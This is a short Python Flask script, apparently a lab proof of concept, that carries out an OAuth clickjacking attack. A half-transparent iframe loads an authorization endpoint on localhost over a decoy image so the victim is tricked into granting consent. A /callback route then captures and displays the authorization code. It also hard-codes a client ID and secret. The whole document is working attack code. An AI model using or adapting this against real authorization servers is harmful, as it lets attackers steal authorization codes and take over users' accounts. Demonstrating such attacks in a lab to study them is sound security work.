# Serve html code that contains an iframe with an oauth request behind an image
# with flask
#
from flask import Flask, request, url_for
import requests
import base64

IP="localhost"
PORT=7777



app = Flask(__name__)

# Fill this vars with the data from the registered client in the AS
client_id = "98cf34e2301a9d77c3a3e46e62cea8b153743cca9a5d23d5"
client_secret = "0fdd7d21633602389ec188da7bd75be6d855cd35bca8a7b8"
redirect_uri = "http://localhost:7777/callback"


@app.route('/')
def iframe():
    return '''
    <iframe style="position: absolute; top: 0; left: 0;  z-index: 1; opacity: 0.5;"
    src="http://localhost:5000/oauth/authorize?response_type=code&client_id=''' \
    + client_id + '''&redirect_uri='''+redirect_uri+'''" width="400" height="400">
    </iframe>
    <img style="position: absolute; top: 0; left: 0; z-index: -1;" 
    src=https://i.redd.it/esnsxmdd5le51.jpg width="400" height="400">
    '''

@app.route('/callback')
def callback():
    code = request.args.get('code')
    return "This is the authorization code: " + code

if __name__ == '__main__':
    app.run(host=IP, port=PORT, debug=True)
